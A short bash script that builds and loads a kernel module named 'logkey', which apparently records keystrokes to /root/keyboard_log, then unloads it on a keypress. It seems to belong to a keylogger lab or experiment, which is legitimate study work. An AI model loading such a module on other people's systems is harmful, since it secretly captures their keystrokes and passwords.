#!/bin/bash

set -e

KERNEL_DIR=kernel
USER_DIR=user

echo "[*] Building kernel module..."
make -C $KERNEL_DIR

echo "[*] Inserting module..."
sudo insmod $KERNEL_DIR/logkey.ko

echo "[*] Module inserted. Check logs with: sudo cat /root/keyboard_log"

read -p "[*] Press Enter to remove module..."

echo "[*] Removing module..."
sudo rmmod logkey
